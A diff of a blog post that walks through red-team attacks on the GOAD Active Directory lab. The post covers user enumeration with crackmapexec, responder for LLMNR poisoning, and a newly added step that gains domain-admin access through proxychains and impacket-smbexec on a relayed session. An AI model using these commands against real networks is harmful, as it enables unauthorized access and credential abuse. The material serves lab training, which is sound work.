@@ -1,7 +1,7 @@
 ---
-title: "GOAD Part 1: AD Recon, NTLM relay, Password Spraying & ASREPRoasting "
+title: "GOAD Part 1: AD Recon, Password Spraying , ASREPRoasting & LLMNR Poisoning "
 author: "Trevor Saudi"
-date: 2024-06-11
+date: 2024-07-9
 description: ""
 draft: false
 subtitle: ""
@@ -39,7 +39,7 @@ tags:
 
 </style>
 
-![image](/posts/2024-06-11_red_team06/images/logo.png)
+![image](/posts/2024-06-21_red_team07/images/logo.png)
 
 
 
@@ -51,7 +51,7 @@ tags:
 
 ## Network Diagram
 
-<div style="width: 930px;">
+<div>
         <img src="/posts/2024-06-11_red_team06/images/GOAD_schema.png" alt="no image" />
 </div>
 
@@ -125,7 +125,7 @@ crackmapexec smb 192.168.56.10-23 --users
         <img src="/posts/2024-06-21_red_team07/images/users-enum.png" alt="no image" />
 </div>
 
-- We get some domain users from the north domain and credentials in a user's description.
+- We get some domain users from the winterfell DC (the DC allows anonymous sessions) and credentials in a user's description. 
 
 | Hostname     | Username                                  |
 |--------------|-------------------------------------------|
@@ -354,6 +354,17 @@ sudo responder -I eth1
 <div>
         <img src="/posts/2024-06-21_red_team07/images/socks.png" alt="no image" />
 </div>
+
+- We can authenticate as edd on the `192.168.56.22` machine `castleback` using `impacket-smbexec`. We can see edd.stark is a domain admin on the north domain
+
+```powershell
+proxychains impacket-smbexec -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
+```
+<div>
+        <img src="/posts/2024-06-21_red_team07/images/eedd.stark.png" alt="no image" />
+</div>
+
+- In part 2, we will work with Bloodhound and see how to hunt for various misconfigurations with our access in the domains.
 
 ## Appendix
 
